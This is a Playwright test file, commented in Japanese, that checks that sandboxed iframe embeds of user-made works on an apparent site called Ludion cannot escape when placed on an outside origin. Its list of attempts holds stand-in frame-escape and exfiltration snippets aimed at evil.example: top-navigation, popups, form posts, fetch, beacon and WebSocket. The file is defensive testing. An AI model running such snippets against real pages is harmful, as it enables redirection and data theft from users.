// EMBED001：埋め込みの住所（/e/<id>）。外のサイトが <iframe src=".../e/<id>"> と書くと、作品が動く。
// 外のオリジン（このテストが立てる小さなサーバー。http://localhost:<別のポート>。127.0.0.1 の Ludion とは別のサイト）に置いた親で、Chromium、WebKit、Firefox の全部で流す（playwright.config.ts の embed-*）。
// 守りは今の枠と同じ。開けたのは「誰の枠に入れるか」だけ。e2e/frame-escape.spec.ts と同じ見本（fixtures/malicious/）で、
// 外の枠の中から、上のページを動かせない、新しい窓を開けない、フォームを送れない、通信できないことを確かめる。
// 今ある枠の応答（desktop、mobile、inline、wall）の CSP は、文字で確かめる（1文字も変わらない）。
import { expect, test, type BrowserContext, type FrameLocator, type Page } from '@playwright/test';
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { PRIVATE_OWNER, privateFixtureId } from '../scripts/private-fixture.mjs';

/** 親の見張りが「読み込めた」の知らせを待つ時間（src/frameGuard.ts の CONFIRM_WAIT_MS）より長く */
const AFTER_GUARD_MS = 2500;
const SYNTHETIC_INPUT = 'ld-synthetic-input';
/**
 * 外のサイト。本物の別のサーバーにする。Playwright が返すだけの名前（http://outside.example）から 127.0.0.1 の枠を開くと、
 * Chromium が「外の網から手元の網へ」の移動として止めるため。手元のサーバーは http なので、外も http にする（https だと WebKit が混在コンテンツとして枠を止める）。
 * 頁は /post?src=<枠の URL>。
 */
let OUTSIDE = '';
let server: Server;

test.beforeAll(async () => {
  server = createServer((request, response) => {
    const params = new URL(request.url ?? '/', 'http://localhost').searchParams;
    const safe = (params.get('src') ?? '').replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;');
    // below=1：枠を画面の下の外に置く（印が縮むのは、枠が半分見えてから。EMBED001-c）。loading="lazy" は付けない（見えなくても読み込ませる）
    const spacer = params.get('below') === '1' ? '<div style="height:200vh"></div>' : '';
    response.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    response.end(`<!doctype html><title>blog</title><h1>A blog</h1>${spacer}<iframe id="embed" src="${safe}" width="640" height="480" style="border:0" title="embed"></iframe>${spacer}`);
  });
  // localhost が ::1 でも 127.0.0.1 でも受ける
  await new Promise<void>((resolve) => server.listen(0, '::', resolve));
  OUTSIDE = `http://localhost:${(server.address() as AddressInfo).port}`;
});

test.afterAll(async () => {
  await new Promise((resolve) => server.close(resolve));
});

const outsidePage = (src: string, below = false) => `${OUTSIDE}/post?src=${encodeURIComponent(src)}${below ? '&below=1' : ''}`;
/** 外のページが移っていないかを見る（? の前まで） */
const withoutQuery = (url: string) => url.replace(/\?.*$/, '');

const ownOrigin = () => new URL(test.info().project.use.baseURL!).origin;

/** 今の枠の応答の CSP（packages/render の FRAME_RESPONSE_CSP）。定数ではなく文字で持つ：1文字でも変われば落ちる */
const FRAME_CSP_TEXT =
  "sandbox allow-scripts allow-forms; form-action 'none'; default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com data:; img-src data: blob:; frame-ancestors 'self'";
/** 今の親のページの CSP（worker/securityHeaders.ts の PARENT_CSP） */
const PARENT_CSP_TEXT = "frame-src 'self'; frame-ancestors 'none'; base-uri 'none'; object-src 'none'";

/**
 * 外のサイトのページを開く。中に /e/<id> の枠を1つ置く。
 * 外のサイトのほかへの要求（自分のサイトと外のサイトの親のほか）で、網まで出たものを、すべて記録する。ここに来たら「届いた」。
 * request の知らせでは数えない。Chromium は CSP で止めた画像にも request を出し、すぐ requestfailed（csp）にするため（網には出ない）。
 * route の手前で止まった要求（CSP、sandbox）は、ここに来ない。
 * 移った先は、frame-escape と同じく、親の見張りが待つ知らせを真似る。
 */
async function openOutside(context: BrowserContext, page: Page, src: string, below = false) {
  const seen: string[] = [];
  const own = ownOrigin();
  const outside = (url: URL) => url.protocol.startsWith('http') && url.origin !== own && url.origin !== OUTSIDE;
  await context.route(outside, (route) => {
    seen.push(route.request().url());
    return route.fulfill({ status: 200, contentType: 'text/html', body: `<!doctype html><title>outside</title><script>parent.postMessage('ld-frame-loaded','*')</script>` });
  });
  // WebSocket は、網に出た接続の知らせで数える（routeWebSocket はページの中の WebSocket を差し替えるので、CSP より前で受けてしまう）
  page.on('websocket', (ws) => seen.push(ws.url()));
  const errors: string[] = [];
  page.on('pageerror', (error) => errors.push(error.message));
  await page.goto(outsidePage(src, below));
  return { seen, errors, url: page.url() };
}

/**
 * 外のページを動かして、枠の上から fraction の分だけを画面の下端に入れる（1 で全部見える）。
 * 画面の外の枠の中は、ブラウザが描画を止める（requestAnimationFrame が回らない）ので、Playwright で押す前に、これで見せる。
 */
const showFraction = (page: Page, fraction: number) =>
  page.evaluate((f) => {
    const frame = document.getElementById('embed')!;
    scrollTo(0, frame.getBoundingClientRect().top + scrollY + frame.offsetHeight * f - innerHeight);
  }, fraction);

const embed = (page: Page): FrameLocator => page.frameLocator('#embed');
const work = (page: Page): FrameLocator => embed(page).frameLocator('iframe[data-ld-frame]');
/** 作品の枠（外の親 → /e/<id> → 作品の枠）。Playwright の Frame */
const workFrame = (page: Page) => page.frames().find((frame) => frame.parentFrame()?.parentFrame() === page.mainFrame())!;
const workPath = (page: Page) => new URL(workFrame(page).url()).pathname;

test.describe('外のサイトの中で動く', () => {
  test('fx-toggle：作品が動き、押せる。pageerror は0。枠は封をした形（sandbox、CSP）', async ({ context, page }) => {
    const { seen, errors } = await openOutside(context, page, `${ownOrigin()}/e/fx-toggle`);
    const host = work(page).locator('#ld-host');
    await expect(host).toHaveAttribute('data-ld-mount', 'ok');
    const toggle = work(page).locator('[data-ld-part="fx-toggle"] [role="switch"]').first();
    const before = await toggle.getAttribute('aria-checked');
    await toggle.click();
    await expect(toggle).not.toHaveAttribute('aria-checked', before ?? '');
    await expect(embed(page).locator('iframe[data-ld-frame]')).toHaveAttribute('sandbox', 'allow-scripts allow-forms');
    expect(workPath(page)).toBe('/frame/fx-toggle/1/embed.html');
    await page.waitForTimeout(AFTER_GUARD_MS);
    expect(errors).toEqual([]);
    expect(seen).toEqual([]);
  });

  test('印を押すと、作品のページが新しいタブで開く。外のページは移らない', async ({ context, page }) => {
    // 枠を画面の外に置く：押す直前に見えるので、印はまだ帯（名前が見えている）。縮んだ時は下の「印の形」
    await openOutside(context, page, `${ownOrigin()}/e/fx-toggle`, true);
    await expect(work(page).locator('#ld-host')).toHaveAttribute('data-ld-mount', 'ok');
    const badge = embed(page).locator('[data-ld-badge]');
    await expect(badge).toHaveText('Ludion · Remix');
    await showFraction(page, 1);
    const [tab] = await Promise.all([context.waitForEvent('page'), badge.click()]);
    await tab.waitForLoadState('domcontentloaded');
    expect(new URL(tab.url()).pathname).toBe('/p/fx-toggle');
    expect(withoutQuery(page.url())).toBe(`${OUTSIDE}/post`);
    await tab.close();
  });

  test('端末の「動きを減らす」設定に従う（全画面の住所と違い、減らさないにはしない）', async ({ context, page }) => {
    await page.emulateMedia({ reducedMotion: 'reduce' });
    await openOutside(context, page, `${ownOrigin()}/e/fx-toggle`);
    await expect(work(page).locator('#ld-host')).toHaveAttribute('data-ld-mount', 'ok');
    expect(await workFrame(page).evaluate(() => matchMedia('(prefers-reduced-motion: reduce)').matches)).toBe(true);
  });
});

/**
 * 印の形（EMBED001-c）。はじめは帯「Ludion · Remix」。枠が半分見えてから3秒で、マークだけ（24×24px、押せる所は 32×32px）に縮む。
 * 名前が見えている時は1回押すと開く。マークだけでも、マウスを乗せた・キーボードで選んだ時は帯に広がって名前が見えるので、1回で開く。
 * 2回にするのは指で触れた時だけ：マークだけの時の1回目は広がるだけ、2回目で開く（EMBED001-c2）。
 * どの場合も、外のページの住所は変わらない。
 */
test.describe('印の形（はじめは帯、半分見えて3秒でマークだけ）', () => {
  /** 縮むまでの時間（worker/embed.ts の BADGE_COLLAPSE_MS） */
  const COLLAPSE_MS = 3000;
  const badgeOf = (page: Page) => embed(page).locator('[data-ld-badge]');
  /** /e/<id> の文書（外の親のすぐ下の枠） */
  const embedFrame = (page: Page) => page.frames().find((frame) => frame.parentFrame() === page.mainFrame())!;
  /** 帯のまま（今の印と同じ形。縦 22px、名前が見える） */
  const expectBand = async (page: Page) => {
    const badge = badgeOf(page);
    await expect(badge).not.toHaveAttribute('data-ld-mark');
    await expect(badge.locator('span')).toBeVisible();
    await expect.poll(async () => Math.round((await badge.boundingBox())!.height)).toBe(22);
  };
  const waitForMark = (page: Page) => expect(badgeOf(page)).toHaveAttribute('data-ld-mark', '', { timeout: COLLAPSE_MS + 7000 });
  /** 新しいタブが開いた数を数える */
  const countTabs = (context: BrowserContext) => {
    const tabs: Page[] = [];
    context.on('page', (tab) => tabs.push(tab));
    return tabs;
  };
  const expectOpensWorkPage = async (context: BrowserContext, press: () => Promise<void>) => {
    const [tab] = await Promise.all([context.waitForEvent('page'), press()]);
    await tab.waitForLoadState('domcontentloaded');
    expect(new URL(tab.url()).pathname).toBe('/p/fx-toggle');
    await tab.close();
  };
  const boxSize = (box: { width: number; height: number } | null) => [Math.round(box!.width), Math.round(box!.height)];
  const mounted = (page: Page) => expect(work(page).locator('#ld-host')).toHaveAttribute('data-ld-mount', 'ok');

  test('半分見える前は縮まない（画面の外、3割だけ見えている）。はじめの印は今の帯と同じ形', async ({ context, page }) => {
    await openOutside(context, page, `${ownOrigin()}/e/fx-toggle`, true);
    // 画面の外でも読み込まれている（loading="lazy" ではない）
    await mounted(page);
    const badge = badgeOf(page);
    // はじめの印：縮む形の印（data-ld-*）も、透明に広げた押せる所もない
    expect(await badge.evaluate((el) => [el.hasAttribute('data-ld-mark'), el.hasAttribute('data-ld-motion'), getComputedStyle(el, '::before').content])).toEqual([false, false, 'none']);
    await page.waitForTimeout(COLLAPSE_MS + 1000);
    await expectBand(page);
    await showFraction(page, 0.3);
    await page.waitForTimeout(COLLAPSE_MS + 1000);
    await expectBand(page);
  });

  test('半分見えてから3秒で、マークだけ（24×24px）に縮む。押せる所は 32×32px', async ({ context, page }) => {
    await openOutside(context, page, `${ownOrigin()}/e/fx-toggle`, true);
    await mounted(page);
    const shown = Date.now();
    await showFraction(page, 0.6);
    await waitForMark(page);
    expect(Date.now() - shown).toBeGreaterThanOrEqual(COLLAPSE_MS);
    const badge = badgeOf(page);
    await expect(badge.locator('span')).toBeHidden();
    await expect.poll(async () => boxSize(await badge.boundingBox())).toEqual([24, 24]);
    // 見た目の外 3px は印に当たり（角も）、外 6px は当たらない（4px ずつ四角に広げた）
    const hits = await embedFrame(page).evaluate(() => {
      const el = document.querySelector('[data-ld-badge]')!;
      const r = el.getBoundingClientRect();
      const on = (x: number, y: number) => el.contains(document.elementFromPoint(x, y));
      return [
        [on(r.left - 3, r.top + r.height / 2), on(r.left + r.width / 2, r.top - 3), on(r.left - 3, r.top - 3), on(r.right + 3, r.bottom + 3)],
        [on(r.left - 6, r.top + r.height / 2), on(r.left + r.width / 2, r.top - 6), on(r.left - 6, r.top - 6)],
      ];
    });
    expect(hits).toEqual([
      [true, true, true, true],
      [false, false, false],
    ]);
    expect(withoutQuery(page.url())).toBe(`${OUTSIDE}/post`);
  });

  /** 縮んだまま（data-ld-mark がある）で、見た目だけ帯に広がり、名前が見えている */
  const expectHeldOpen = async (page: Page) => {
    const badge = badgeOf(page);
    await expect(badge).toHaveAttribute('data-ld-mark', '');
    await expect(badge.locator('span')).toBeVisible();
    await expect.poll(async () => Math.round((await badge.boundingBox())!.height)).toBe(22);
  };

  test('マークだけの時、マウスを乗せると帯に広がり、1回で開く。離すと、またマークだけ。外のページは移らない', async ({ context, page }) => {
    await openOutside(context, page, `${ownOrigin()}/e/fx-toggle`);
    await waitForMark(page);
    await badgeOf(page).hover();
    await expectHeldOpen(page);
    const tabs = countTabs(context);
    await expectOpensWorkPage(context, () => badgeOf(page).click());
    expect(tabs).toHaveLength(1);
    expect(withoutQuery(page.url())).toBe(`${OUTSIDE}/post`);
    await page.mouse.move(1, 1);
    await expect(badgeOf(page).locator('span')).toBeHidden();
    await expect.poll(async () => boxSize(await badgeOf(page).boundingBox())).toEqual([24, 24]);
  });

  test('マークだけの時、キーボードで選ぶと帯に広がり、Enter 1回で開く。外のページは移らない', async ({ context, page }) => {
    await openOutside(context, page, `${ownOrigin()}/e/fx-toggle`);
    await waitForMark(page);
    await badgeOf(page).focus();
    expect(await badgeOf(page).evaluate((el) => el.matches(':focus-visible'))).toBe(true);
    await expectHeldOpen(page);
    const tabs = countTabs(context);
    await expectOpensWorkPage(context, () => page.keyboard.press('Enter'));
    expect(tabs).toHaveLength(1);
    expect(withoutQuery(page.url())).toBe(`${OUTSIDE}/post`);
  });

  test('マークだけの時、pointerdown のない click（element.click()。読み上げの道具の操作など）は、乗せず選ばずでも1回で開く。外のページは移らない', async ({ context, page }) => {
    await openOutside(context, page, `${ownOrigin()}/e/fx-toggle`);
    await waitForMark(page);
    const badge = badgeOf(page);
    // 乗せていない、選んでいない（held が偽）。見た目はマークだけ
    expect(await badge.evaluate((el) => [el.matches(':hover'), el.matches(':focus-visible')])).toEqual([false, false]);
    await expect(badge.locator('span')).toBeHidden();
    await badge.evaluate((el) => {
      const log: string[] = [];
      el.addEventListener('pointerdown', (e) => log.push((e as PointerEvent).pointerType));
      el.addEventListener('click', () => log.push('click'));
      (window as unknown as { __ldClickLog: string[] }).__ldClickLog = log;
    });
    const tabs = countTabs(context);
    await expectOpensWorkPage(context, () => badge.evaluate((el) => (el as HTMLElement).click()));
    expect(tabs).toHaveLength(1);
    // click だけが届いた（pointerdown はない）
    expect(await badge.evaluate(() => (window as unknown as { __ldClickLog: string[] }).__ldClickLog)).toEqual(['click']);
    await expect(badge).toHaveAttribute('data-ld-mark', '');
    expect(withoutQuery(page.url())).toBe(`${OUTSIDE}/post`);
  });

  test('動きを減らす設定では、縮む動きを付けずに切り替える', async ({ context, page }) => {
    await page.emulateMedia({ reducedMotion: 'reduce' });
    await openOutside(context, page, `${ownOrigin()}/e/fx-toggle`);
    await waitForMark(page);
    const style = await badgeOf(page).evaluate((el) => [getComputedStyle(el).transitionDuration, getComputedStyle(el.querySelector('span')!).transitionDuration]);
    expect(style.join(',').split(',').every((d) => d.trim() === '0s')).toBe(true);
    await expect.poll(async () => boxSize(await badgeOf(page).boundingBox())).toEqual([24, 24]);
  });

  test('対照：動きを減らさない設定では、縮む動きが付いている', async ({ context, page }) => {
    await page.emulateMedia({ reducedMotion: 'no-preference' });
    await openOutside(context, page, `${ownOrigin()}/e/fx-toggle`);
    await waitForMark(page);
    expect(await badgeOf(page).evaluate((el) => getComputedStyle(el).transitionDuration)).toContain('0.18s');
  });

  test.describe('指で触れる端末', () => {
    test.use({ hasTouch: true });

    test('マークだけの時、指で1回目は広がるだけで開かず、2回目で開く。外のページは移らない', async ({ context, page }) => {
      await openOutside(context, page, `${ownOrigin()}/e/fx-toggle`);
      await waitForMark(page);
      const tabs = countTabs(context);
      await badgeOf(page).tap();
      await page.waitForTimeout(1000);
      expect(tabs).toHaveLength(0);
      await expect(badgeOf(page)).not.toHaveAttribute('data-ld-mark');
      await expectOpensWorkPage(context, () => badgeOf(page).tap());
      expect(withoutQuery(page.url())).toBe(`${OUTSIDE}/post`);
    });

    test('指で広げた後、触れずにいると3秒で、また縮む。縮んだら、また1回目は広がるだけ', async ({ context, page }) => {
      await openOutside(context, page, `${ownOrigin()}/e/fx-toggle`);
      await waitForMark(page);
      const tabs = countTabs(context);
      await badgeOf(page).tap();
      await expectBand(page);
      await waitForMark(page);
      await badgeOf(page).tap();
      await page.waitForTimeout(1000);
      expect(tabs).toHaveLength(0);
      await expect(badgeOf(page)).not.toHaveAttribute('data-ld-mark');
      expect(withoutQuery(page.url())).toBe(`${OUTSIDE}/post`);
    });

    // マウスを乗せられる端末の触れる画面（触れる画面の PC など）。指で触れた後も :hover が残るが、指なら2回のまま。
    // Playwright の hasTouch は「乗せられない端末」（(hover:hover) が偽）にするので、ここでは hasTouch を付けず、
    // Chromium の CDP で指の操作を直に送る（ほかのブラウザにはこの道がない）。CDP の操作の位置は上のページの画面の座標なので、/e/<id> を直に開く
    test.describe('乗せられる端末', () => {
      test.use({ hasTouch: false });

      test('乗せられる端末の触れる画面でも、指で1回目は広がるだけで開かず、2回目で開く（Chromium）', async ({ browserName, context, page }) => {
        test.skip(browserName !== 'chromium', '乗せられる端末の触れる画面で指の操作を送れるのは Chromium の CDP だけ');
        await page.goto(`${ownOrigin()}/e/fx-toggle`);
        const badge = page.locator('[data-ld-badge]');
        expect(await badge.evaluate(() => matchMedia('(hover:hover)').matches)).toBe(true);
        await expect(badge).toHaveAttribute('data-ld-mark', '', { timeout: COLLAPSE_MS + 7000 });
        const cdp = await context.newCDPSession(page);
        const fingerTap = async () => {
          const box = (await badge.boundingBox())!;
          const point = { x: box.x + box.width / 2, y: box.y + box.height / 2 };
          await cdp.send('Input.dispatchTouchEvent', { type: 'touchStart', touchPoints: [point] });
          await cdp.send('Input.dispatchTouchEvent', { type: 'touchEnd', touchPoints: [] });
        };
        const seen: string[] = await badge.evaluate((el) => {
          const log: string[] = [];
          el.addEventListener('pointerdown', (e) => log.push((e as PointerEvent).pointerType));
          el.addEventListener('click', () => log.push(`click hover=${el.matches(':hover')}`));
          (window as unknown as { __ldTapLog: string[] }).__ldTapLog = log;
          return log;
        });
        expect(seen).toEqual([]);
        const tabs = countTabs(context);
        await fingerTap();
        // 指で触れた（pointerdown が touch）。click の時に :hover が真（held だけで見れば1回で開いてしまう形）
        await expect.poll(() => page.evaluate(() => (window as unknown as { __ldTapLog: string[] }).__ldTapLog)).toEqual(['touch', 'click hover=true']);
        await page.waitForTimeout(1000);
        expect(tabs).toHaveLength(0);
        await expect(badge).not.toHaveAttribute('data-ld-mark');
        await expectOpensWorkPage(context, fingerTap);
      });
    });
  });
});

test.describe('外の枠の中からも、外へ出られない（SEC001 の観点）', () => {
  test('クリックで移る（mal-nav）：外へ届かず、外のページも /e/ も移らず、作品は動いたまま', async ({ context, page }) => {
    const { seen } = await openOutside(context, page, `${ownOrigin()}/e/mal-nav`);
    const button = work(page).locator('[data-ld-part="mal-nav"] .go');
    await button.click();
    await page.waitForTimeout(AFTER_GUARD_MS);
    expect(seen).toEqual([]);
    await expect(button).toBeAttached();
    expect(workPath(page)).toBe('/frame/mal-nav/1/embed.html');
    expect(withoutQuery(page.url())).toBe(`${OUTSIDE}/post`);
  });

  test('location を別名で参照して、入力を送ろうとする（mal-nav-alias）：外へ届かない', async ({ context, page }) => {
    const { seen } = await openOutside(context, page, `${ownOrigin()}/e/mal-nav-alias`);
    const part = work(page).locator('[data-ld-part="mal-nav-alias"]');
    await part.locator('input').fill(SYNTHETIC_INPUT);
    await part.locator('.go').click();
    await page.waitForTimeout(AFTER_GUARD_MS);
    expect(seen).toEqual([]);
    expect(withoutQuery(page.url())).toBe(`${OUTSIDE}/post`);
  });

  for (const [id, wait] of [
    ['mal-nav-fake-ready', AFTER_GUARD_MS * 2],
    ['mal-nav-loop', AFTER_GUARD_MS * 4],
  ] as const) {
    test(`読み込みの途中や、読み込むたびに移る（${id}）：外へ届かない。外のページは移らない`, async ({ context, page }) => {
      const { seen } = await openOutside(context, page, `${ownOrigin()}/e/${id}`);
      await page.waitForTimeout(wait);
      expect(seen).toEqual([]);
      expect(withoutQuery(page.url())).toBe(`${OUTSIDE}/post`);
    });
  }

  const attempts: [string, string][] = [
    ['上のページの住所を変える（top.location）', `try { top.location.href = 'https://evil.example/top'; } catch {}`],
    ['上のページを別名で変える（parent.parent.location）', `try { parent.parent.location = 'https://evil.example/top2'; } catch {}`],
    ['新しい窓を開く（window.open）', `window.__opened = String(window.open('https://evil.example/open'));`],
    ['target="_blank" のリンクを押す', `const a = document.createElement('a'); a.href = 'https://evil.example/blank'; a.target = '_blank'; document.body.append(a); a.click();`],
    ['target="_top" のリンクを押す', `const a = document.createElement('a'); a.href = 'https://evil.example/link-top'; a.target = '_top'; document.body.append(a); a.click();`],
    [
      'フォームを送る',
      `const f = document.createElement('form'); f.action = 'https://evil.example/form'; f.method = 'post'; const i = document.createElement('input'); i.name = 'q'; i.value = '${SYNTHETIC_INPUT}'; f.append(i); document.body.append(f); f.submit();`,
    ],
    ['通信する（fetch、画像、ビーコン、WebSocket）', `fetch('https://evil.example/fetch').catch(() => {}); fetch('/api/works').catch(() => {}); new Image().src = 'https://evil.example/img'; try { navigator.sendBeacon('https://evil.example/beacon', 'x'); } catch {} try { new WebSocket('wss://evil.example/ws'); } catch {}`],
  ];

  for (const [label, code] of attempts) {
    test(`${label}：届かない。外のページは移らない。新しいタブは開かない`, async ({ context, page }) => {
      const { seen } = await openOutside(context, page, `${ownOrigin()}/e/mal-nav`);
      await expect(work(page).locator('[data-ld-part="mal-nav"]')).toBeAttached();
      const own: string[] = [];
      // 自分のサイトへの通信も、終わったものだけを数える（CSP で止まったものは requestfailed になる）
      context.on('requestfinished', (request) => {
        if (request.frame() === workFrame(page) && new URL(request.url()).pathname.startsWith('/api/')) own.push(request.url());
      });
      const tabs: Page[] = [];
      context.on('page', (tab) => tabs.push(tab));
      await workFrame(page).evaluate(code).catch(() => {}); // 移ると評価の結果は返らない
      await page.waitForTimeout(AFTER_GUARD_MS);
      expect(seen).toEqual([]);
      expect(own).toEqual([]);
      expect(tabs).toEqual([]);
      expect(withoutQuery(page.url())).toBe(`${OUTSIDE}/post`);
    });
  }

  test('対照：同じ通信を外のページ自身（CSP も sandbox もない）でやると届く（数え方が働いている）', async ({ context, page }) => {
    const { seen } = await openOutside(context, page, `${ownOrigin()}/e/mal-nav`);
    await page.evaluate(attempts.at(-1)![1]);
    await expect.poll(() => seen.toSorted()).toEqual(['https://evil.example/beacon', 'https://evil.example/fetch', 'https://evil.example/img', 'wss://evil.example/ws']);
  });

  test('対照：/e/ の応答の CSP を外すと、クリックで外へ届く（見本と見張りが本当に働いている）', async ({ context, page }) => {
    await context.route(`${ownOrigin()}/e/mal-nav`, async (route) => {
      const response = await route.fetch();
      const headers = { ...response.headers() };
      delete headers['content-security-policy'];
      await route.fulfill({ response, headers });
    });
    const { seen } = await openOutside(context, page, `${ownOrigin()}/e/mal-nav`);
    await work(page).locator('[data-ld-part="mal-nav"] .go').click();
    await expect.poll(() => seen.filter((url) => url.endsWith('/moved'))).not.toEqual([]);
  });

  test('外のサイトが埋め込みの枠（embed.html）を直に置いても、作品は出ない（印を飛ばせない）', async ({ context, page }) => {
    await openOutside(context, page, `${ownOrigin()}/frame/fx-toggle/1/embed.html`);
    await page.waitForTimeout(AFTER_GUARD_MS);
    const host = await Promise.race([
      page
        .frames()
        .find((frame) => frame !== page.mainFrame())
        ?.evaluate(() => document.getElementById('ld-host') !== null)
        .catch(() => false),
      new Promise<boolean>((resolve) => setTimeout(() => resolve(false), AFTER_GUARD_MS)),
    ]);
    expect(host).toBe(false);
  });
});

test.describe('出せるもの、出せないもの', () => {
  test('下書き、取り下げ、自分だけ、ない作品は 404（/e/ も枠も）', async ({ request }) => {
    for (const id of ['seed-embed-draft', 'seed-embed-withdrawn', privateFixtureId('mal-nav'), 'no-such-work']) {
      const page = await request.get(`/e/${id}`);
      expect(page.status(), id).toBe(404);
      expect(await page.text(), id).not.toContain('<iframe');
      const frame = await request.get(`/frame/${id}/1/embed.html`, { headers: { 'Sec-Fetch-Dest': 'iframe', 'Sec-Fetch-Site': 'same-origin' } });
      expect(frame.status(), id).toBe(404);
    }
  });

  test('/e/ の応答：noindex、外の枠に入れる CSP、作品のページと同じキャッシュ。サイトのスクリプト（React、GA4）を読まない', async ({ request }) => {
    const response = await request.get('/e/fx-toggle');
    expect(response.status()).toBe(200);
    const headers = response.headers();
    expect(headers['content-security-policy']).toBe("frame-src 'self'; frame-ancestors *; base-uri 'none'; object-src 'none'");
    expect(headers['x-robots-tag']).toBe('noindex, nofollow');
    expect(headers['cache-control']).toBe('public, max-age=0, s-maxage=60');
    expect(headers['cache-tag']).toBe('catalog');
    expect(headers['set-cookie']).toBeUndefined();
    const html = await response.text();
    expect(html).toContain('<meta name="robots" content="noindex, nofollow">');
    expect(html).toContain('src="/frame/fx-toggle/1/embed.html"');
    expect(html).not.toMatch(/<script[^>]+src=|\/assets\/|googletagmanager|gtag|id="root"/);
  });

  test('ログインしていても、/e/ の中身は同じ（Cookie を読まない）', async ({ request, playwright }) => {
    const signedIn = await playwright.request.newContext({ baseURL: ownOrigin(), extraHTTPHeaders: { Cookie: 'ld_session=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef' } });
    expect(await (await signedIn.get('/e/fx-toggle')).text()).toBe(await (await request.get('/e/fx-toggle')).text());
    await signedIn.dispose();
  });

  test('埋め込みの枠の応答：封は今の枠と同じで、frame-ancestors だけが違う。キャッシュしない。外から開くと作品のページへ戻る', async ({ request }) => {
    const response = await request.get('/frame/fx-toggle/1/embed.html', { headers: { 'Sec-Fetch-Dest': 'iframe', 'Sec-Fetch-Site': 'same-origin' } });
    expect(response.status()).toBe(200);
    expect(response.headers()['content-security-policy']).toBe(FRAME_CSP_TEXT.replace("frame-ancestors 'self'", 'frame-ancestors *'));
    expect(response.headers()['cache-control']).toBe('private, no-store');
    expect(await response.text()).not.toMatch(/googletagmanager|gtag/);
    for (const headers of [{}, { 'Sec-Fetch-Dest': 'document' }, { 'Sec-Fetch-Dest': 'iframe', 'Sec-Fetch-Site': 'cross-site' }, { 'Sec-Fetch-Dest': 'iframe' }] as Record<string, string>[]) {
      const away = await request.get('/frame/fx-toggle/1/embed.html', { headers, maxRedirects: 0 });
      expect(away.status(), JSON.stringify(headers)).toBe(302);
      expect(away.headers()['location']).toBe('/p/fx-toggle');
    }
  });

  test('今ある枠の応答（desktop、mobile、inline、wall）と親のページの CSP は、1文字も変わらない', async ({ request }) => {
    for (const file of ['desktop.html', 'mobile.html', 'inline.html', 'wall.html']) {
      const response = await request.get(`/frame/fx-toggle/1/${file}`, { headers: { 'Sec-Fetch-Dest': 'iframe' } });
      expect(response.status(), file).toBe(200);
      expect(response.headers()['content-security-policy'], file).toBe(FRAME_CSP_TEXT);
    }
    for (const path of ['/p/fx-toggle', '/p/fx-toggle/wall', '/', '/about']) {
      expect((await request.get(path)).headers()['content-security-policy'], path).toBe(PARENT_CSP_TEXT);
    }
  });
});

test.describe('作品のページの「埋め込む」', () => {
  const openWorkPage = async (page: Page, id: string) => {
    await page.goto(`/p/${id}`);
    await page.waitForFunction(() => Object.keys(document.getElementById('root')!).some((key) => key.startsWith('__reactContainer')));
  };

  test('「コードをコピー」の次にあり、押すと1行の <iframe> が出る。幅と高さは作品の比率、title と loading="lazy" 付き', async ({ page }) => {
    await page.setViewportSize({ width: 1440, height: 900 });
    await openWorkPage(page, 'fx-toggle');
    const copyButton = page.getByRole('button', { name: 'コードをコピー' });
    const embedButton = page.getByRole('button', { name: '埋め込む' });
    // 並びは変えない：「コードをコピー」の次のボタン
    const next = await copyButton.evaluate((button) => {
      let node = button.nextElementSibling;
      while (node && node.tagName !== 'BUTTON') node = node.nextElementSibling;
      return node?.textContent ?? null;
    });
    expect(next).toBe('埋め込む');
    await expect(embedButton).toHaveAttribute('aria-expanded', 'false');
    const field = page.getByRole('textbox', { name: 'Quiet Switchesの埋め込みのコード' });
    await expect(field).toBeHidden();
    await embedButton.click();
    await expect(embedButton).toHaveAttribute('aria-expanded', 'true');
    await expect(field).toHaveValue(
      '<iframe src="https://ludion.ai/e/fx-toggle" width="640" height="480" style="border:0;max-width:100%;height:auto;aspect-ratio:640/480" title="Quiet Switches · UI by @fixture · Ludion" loading="lazy"></iframe>',
    );
  });

  test('Web の画面は 1280:800 の比率（640×400）', async ({ page }) => {
    await openWorkPage(page, 'fx-landing');
    await page.getByRole('button', { name: '埋め込む' }).click();
    await expect(page.getByRole('textbox', { name: 'Tidy Notes Landingの埋め込みのコード' })).toHaveValue(/width="640" height="400" .*aspect-ratio:640\/400/);
  });

  test('「埋め込みのコードをコピー」で、その1行がクリップボードに入る', async ({ context, page, browserName }) => {
    test.skip(browserName !== 'chromium', 'クリップボードを読む許可は Chromium だけで渡せる');
    await context.grantPermissions(['clipboard-read', 'clipboard-write'], { origin: ownOrigin() });
    await openWorkPage(page, 'fx-toggle');
    await page.getByRole('button', { name: '埋め込む' }).click();
    const copyEmbed = page.getByRole('button', { name: '埋め込みのコードをコピー' });
    await copyEmbed.click();
    await expect(page.getByRole('button', { name: 'コピーしました' })).toHaveCount(1);
    const copied = await page.evaluate(() => navigator.clipboard.readText());
    expect(copied).toBe(await page.getByRole('textbox', { name: 'Quiet Switchesの埋め込みのコード' }).inputValue());
  });

  test('その1行を外のサイトに貼ると、作品が動く（住所だけ手元に替える）', async ({ context, page }) => {
    await openWorkPage(page, 'fx-toggle');
    await page.getByRole('button', { name: '埋め込む' }).click();
    const line = await page.getByRole('textbox', { name: 'Quiet Switchesの埋め込みのコード' }).inputValue();
    const src = /src="([^"]+)"/.exec(line)![1].replace('https://ludion.ai', ownOrigin());
    await openOutside(context, page, src);
    await expect(work(page).locator('#ld-host')).toHaveAttribute('data-ld-mount', 'ok');
  });

  test('自分だけの作品のページには出ない（外に出せない）', async ({ context, page }) => {
    await context.addCookies([{ name: 'ld_session', value: PRIVATE_OWNER.session, url: ownOrigin() }]);
    await openWorkPage(page, privateFixtureId('mal-nav'));
    await expect(page.getByRole('button', { name: 'コードをコピー' })).toBeVisible();
    await expect(page.getByRole('button', { name: '埋め込む' })).toHaveCount(0);
  });

  test('英語のページでも出る', async ({ page }) => {
    await page.goto('/en/p/fx-toggle');
    await page.getByRole('button', { name: 'Embed', exact: true }).click();
    await expect(page.getByRole('textbox', { name: 'Embed code of Quiet Switches' })).toHaveValue(/^<iframe src="https:\/\/ludion\.ai\/e\/fx-toggle"/);
    await expect(page.getByRole('button', { name: 'Copy embed code' })).toBeVisible();
  });
